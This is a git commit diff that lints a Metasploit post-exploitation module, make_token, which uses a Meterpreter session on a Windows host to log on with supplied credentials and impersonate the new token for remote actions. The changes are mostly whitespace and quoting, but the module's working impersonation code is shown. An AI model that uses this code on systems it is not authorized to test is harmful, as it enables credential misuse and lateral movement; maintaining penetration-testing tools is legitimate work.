a34c3cf055e47978dead1d2911c58d4cafa9bde6
attl4s <lopezjimdaniel@gmail.com>
2023-06-06 09:07:57 +0200

    linted - all offenses addressed

--- modules/post/windows/manage/make_token.rb
+++ modules/post/windows/manage/make_token.rb
@@ -11,21 +11,24 @@ class MetasploitModule < Msf::Post
         info,
         'Name' => 'Make Token Command',
         'Description' => %q{
-          In its default configuration, this module creates a new network security context with the specified 
+          In its default configuration, this module creates a new network security context with the specified
           logon data (username, domain and password). Under the hood, Meterpreter's access token is cloned, and
-          a new logon session is created and linked to that token. The token is then impersonated to acquire 
-          the new network security context. This module has no effect on local actions - only on remote ones 
-          (where the specified credential material will be used). This module does not validate the credentials 
+          a new logon session is created and linked to that token. The token is then impersonated to acquire
+          the new network security context. This module has no effect on local actions - only on remote ones
+          (where the specified credential material will be used). This module does not validate the credentials
           specified.
         },
         'License' => MSF_LICENSE,
         'Notes' => {
-          'AKA' => ['make_token', 'maketoken']
+          'AKA' => ['make_token', 'maketoken'],
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
         },
         'Platform' => ['win'],
         'SessionTypes' => ['meterpreter'],
         'Author' => [
-          'Daniel López Jiménez (attl4s)', 
+          'Daniel López Jiménez (attl4s)',
           'Simone Salucci (saim1z)'
         ],
         'Compat' => {
@@ -50,7 +53,7 @@ class MetasploitModule < Msf::Post
 
     register_advanced_options(
       [
-      	OptEnum.new('LOGONTYPE', [true, 'The type of logon operation to perform. Using LOGON32_LOGON_INTERACTIVE may cause issues within the session (typically due to the token filtering done by the UserAccountControl mechanism in Windows). Use with caution', 'LOGON32_LOGON_NEW_CREDENTIALS', ['LOGON32_LOGON_BATCH', 'LOGON32_LOGON_INTERACTIVE', 'LOGON32_LOGON_NETWORK', 'LOGON32_LOGON_NETWORK_CLEARTEXT', 'LOGON32_LOGON_NEW_CREDENTIALS', 'LOGON32_LOGON_SERVICE', 'LOGON32_LOGON_UNLOCK']]),
+        OptEnum.new('LOGONTYPE', [true, 'The type of logon operation to perform. Using LOGON32_LOGON_INTERACTIVE may cause issues within the session (typically due to the token filtering done by the UserAccountControl mechanism in Windows). Use with caution', 'LOGON32_LOGON_NEW_CREDENTIALS', ['LOGON32_LOGON_BATCH', 'LOGON32_LOGON_INTERACTIVE', 'LOGON32_LOGON_NETWORK', 'LOGON32_LOGON_NETWORK_CLEARTEXT', 'LOGON32_LOGON_NEW_CREDENTIALS', 'LOGON32_LOGON_SERVICE', 'LOGON32_LOGON_UNLOCK']]),
       ]
     )
   end
@@ -66,9 +69,9 @@ class MetasploitModule < Msf::Post
     logontype = datastore['LOGONTYPE']
 
     # revert any existing impersonation before doing a new one
-    print_status("Executing rev2self to revert any previous token impersonations")
+    print_status('Executing rev2self to revert any previous token impersonations')
     session.sys.config.revert_to_self
-    
+
     # create new logon session / token pair
     print_status("Executing LogonUserA with the flag #{logontype} to create a new security context for #{domain}\\#{user}")
     logon_user = session.railgun.advapi32.LogonUserA(user, domain, password, logontype, 'LOGON32_PROVIDER_DEFAULT', 4)
@@ -76,15 +79,15 @@ class MetasploitModule < Msf::Post
     if logon_user['return']
       # get the token handle
       ph_token = logon_user['phToken']
-      print_status("Impersonating the new security context...")
-      
+      print_status('Impersonating the new security context...')
+
       # store the token within the server
       session.sys.config.update_token(ph_token)
-      print_good("The session should now run with the new security context!")
-      
-      # send warning 
+      print_good('The session should now run with the new security context!')
+
+      # send warning
       if logontype == 'LOGON32_LOGON_NEW_CREDENTIALS'
-        print_warning("Remember that this will not have any effect on local actions (i.e. getuid will still show the original user)")
+        print_warning('Remember that this will not have any effect on local actions (i.e. getuid will still show the original user)')
       end
     else
       print_error("LogonUserA call failed, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
